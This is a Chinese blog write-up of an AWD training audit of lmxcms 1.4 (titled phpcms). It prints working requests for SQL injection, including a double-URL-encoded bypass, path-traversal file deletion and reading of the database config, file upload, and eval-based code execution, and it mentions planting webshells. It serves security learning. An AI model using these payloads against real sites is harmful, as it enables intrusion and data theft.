---
title: "一个男人一句话改变我的一生之phpcms代码审计"
date: "2025-10-13 15:56:32"
tags: ["代码审计"]
categories: ["一个男人一句话改变我的一生"]
url: "/posts/12382.html"
abbrlink: "12382"
---

```
写在前面：在各位大师傅的投喂下，涨了很多见识所以开始了一个男人一句话改变我的一生系列。
这一期是跟su战队的_sun_·empty.师傅和timeline战队的扬丘师傅的一次awd训练赛，在_sun_·empty.说要复盘才有意义的建议下。
写了这篇上年纪的cms代码审计，如文章有任何问题可以联系我进行交流，感谢观看
```

# lmxcms1.4，代码审计--复现

在awd训练赛中遇到了这套cms，于是打算学习审计一手

每种漏洞只找了一个代表学习不代表只要一个，实际的漏洞点有很多

参考了师傅们的博客,先在这里贴一手

```
https://blog.csdn.net/qq_45764684/article/details/130962179
https://blog.csdn.net/qq_38154820/article/details/129836774
https://xz.aliyun.com/news/14971
```

```
常规搭建cms：phpstudy+phpstorm,apache2.4.39+MySQL5.7.26,php5.3.29

在小皮面板搭建之后，直接访问/install，根据流程设计数据库，后台账号密码就好了

后台默认密码 admin/123456
```

![image-20251010233911216](/images/image-20251010233911216.png)

### cms请求处理格式

进来先看到前台入口文件

配置文件：/inc/config.inc.php

初始化文件：/inc/run.inc.php

![image-20251010225942615](/images/image-20251010225942615.png)

![image-20251010230623939](/images/image-20251010230623939.png)

全局【ctrl+shift+alt+n】搜run()

![image-20251010230743576](/images/image-20251010230743576.png)

分别传参是类名，方法名

[?m=xx](http://127.0.0.1/lmxcms1.4/admin.php?m=xx)类名&a=xx方法

### 后台SQL注入漏洞

漏洞点：参数可控，参与执行sql语句

在bookaction.class.php,可控参数名id,进入getReply函数![image-20251010231637489](/images/image-20251010231637489.png)

getReply--->selectModel--->selectDB

![image-20251010232525224](/images/image-20251010232525224.png)

![image-20251010232529755](/images/image-20251010232529755.png)

![image-20251010232533337](/images/image-20251010232533337.png)

可以发现将id传进去，一层解一层在selectDB执行了sql语句

常规调试是不会看到sql语句，在执行之后添加echo $sql;来看具体的调试情况

![image-20251010232925033](/images/image-20251010232925033.png)

根据前面知道的请求格式，给id随便传个参数，注意方法名是一开始的reply()

【注意这个是admin下的后台漏洞】

```
/admin.php?m=book&a=reply&id=1
```

![image-20251010233433548](/images/image-20251010233433548.png)

有回显，报错注入

```
/admin.php?m=Book&a=reply&id=1) and updatexml(0,concat(0x7e,user()),1)--+
```

![image-20251010233633278](/images/image-20251010233633278.png)

### 前台SQL注入漏洞

漏洞点：在过滤函数之前进行url解码【不严格】

找到name参数，由data来，追踪p有post和get传输

![](/images/image-20251011103134787.png)

有post和get传输，说明参数可控，回到处理name数据函数



![](/images/image-20251011103209563.png)

继续跟进getNameData

![](/images/image-20251011103412666.png)

-->onemodel![image-20251011103422783](/images/image-20251011103422783.png)

--->oneDB,在oneDB中执行了sql语句，

![](/images/image-20251011103459787.png)

同时在p处理data的时候，发现了过滤非法提交信息函数filte_sql![](/images/image-20251011103845173.png)

但是回到主函数可以看到有urldecode 并且是在执行sql语句之后

![image-20251011105045779](/images/image-20251011105045779.png)

二次编码注入：当对name传输数据时会先进行一次url解码，如果将payload二次编码，解了一次之后还有一层url编码，filte_sql就过滤不了恶意payload，产生漏洞了

【注意：客户端和服务端看代码的流程是要反过来的】

```
a' and updatexml(1,concat(0x7e,(select version()),0x7e),1) #
```

```
/index.php?m=tags&name=%25%36%31%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%37%35%25%37%30%25%36%34%25%36%31%25%37%34%25%36%35%25%37%38%25%36%64%25%36%63%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%63%25%33%31%25%32%39%25%32%30%25%32%33
```

![image-20251011105625012](/images/image-20251011105625012.png)

### 后台任意文件删除

漏洞点：unlink函数

全局搜索调用情况

![image-20251011111212814](/images/image-20251011111212814.png)

delone

![image-20251011111317078](/images/image-20251011111317078.png)

delbackdb调用了delone，发现filename是get可控参数

![image-20251011111339902](/images/image-20251011111339902.png)

```
/admin.php？m=Backdb&a=delbackdb&filename=../../install/1.txt
```

![image-20251011111727606](/images/image-20251011111727606.png)

### 后台任意文件读取

漏洞点文件读取函数file_get_contents

![image-20251011113130400](/images/image-20251011113130400.png)

查看getcon调用情况

![image-20251011113321090](/images/image-20251011113321090.png)

dir参数可控，在当前editfile目录访问就能进行读取

```
http://lmxcms//admin.php?m=Template&a=editfile&dir=admin/AD//ad.html

http://lmxcms//admin.php?m=Template&a=editfile&dir=../inc//db.inc.php
```

注意最后查看是//

![image-20251011114801112](/images/image-20251011114801112.png)

### 后台文件上传漏洞

漏洞点：file_put_contents函数

在任意读取当中也存在文件上传漏洞 

![image-20251011115339998](/images/image-20251011115339998.png)

![image-20251011115404627](/images/image-20251011115404627.png)

post分别传入文件名称跟内容就好了【没有测成功】

![image-20251011143322125](/images/image-20251011143322125.png)

黑盒的后台文件上传漏洞，可以自行修改文件上传类型

![image-20251011143422118](/images/image-20251011143422118.png)

上传构造好的php文件就好了

![image-20251011143530032](/images/image-20251011143530032.png)

### 后台命令执行漏洞

漏洞点：sql写马导致rec

找到eval函数 跟进参数get传参cid可控

![image-20251011144452040](/images/image-20251011144452040.png)

走进caijidataone函数，发现掉了cj_data_tab()

![image-20251011144548654](/images/image-20251011144548654.png)

查询的是cj_data表

![image-20251011144730710](/images/image-20251011144730710.png)

![image-20251011144741088](/images/image-20251011144741088.png)

![image-20251011144744835](/images/image-20251011144744835.png)

那么只要在cj_data表中插入，恶意代码，在执行sql查询执行了恶意代码实现命令执行,后台找到可以执行sql语句的地方

![image-20251011150025893](/images/image-20251011150025893.png)

```
INSERT INTO `lmxcms`.`lmx_cj_data` (`id`, `lid`, `data`, `uid`, `url`, `time`) VALUES (3, 4, 'phpinfo()', 33, 'a', 5);

/admin.php?m=Acquisi&a=showCjData&id=1&lid=4&cid=3
```

![image-20251011150355759](/images/image-20251011150355759.png)

![image-20251011145940775](/images/image-20251011145940775.png)

### awd思路

因为是从awd中遇到的cms，如何获得flag，提交拿到分数才是重点

能获得本地根目录下的flag基本上是后台漏洞为主

#### 登陆对抗

##### 维护

连接相应的数据库替换 admin的默认密码pwd字段【是否加salt】

![image-20251011151829593](/images/image-20251011151829593.png)

##### 攻击

如果cms的默认密码被改了的情况下，可以使用前台sql注入漏洞获得相应admin的pwd字段【但不一定能够解密出来】

##### 利用

在awd当中要攻击的主机不止一台，在没有权限控制的情况下，是否可以写一个批量登陆脚本获得cookie【没来得及验证】，为后面打exp要验证管理员身份做铺垫

#### 漏洞总结

在awd过程当中这一套cms的漏洞打得多的是删除和上传。

在读取没有被修的情况下，效率最高，只要登陆后台，打exp就好了

打的时候，发现家里啥都被删没了和多了一堆马子都是痛苦的

文件上传点依旧是经典的一句话木马转不死马，被打进来的时候，还找不到竞争脚本，下次应该开局先放上去的

这一次的点全在后台，打exp要权限验证，没整过这个点，以至于后面摆烂拖后腿了

维护的话，还是感觉修改默认密码，加ctf_waf，每个点改的话来不及，但是这次都没加【下源码下了20分钟】不嘻嘻

### 总结

这次坑了sun和杨丘师傅，感谢不杀之恩，我下一次肯定会做到的【坚信】

phpcms的代码审计，寻找可控参数变量，有没有参与危险函数，白盒+黑盒一起试，搭建的时候注意配置，awd的时候，要快速的打exp和历史漏洞获得分数，注意常规的维护。pwn是堆溢出【等我再沉淀沉淀】

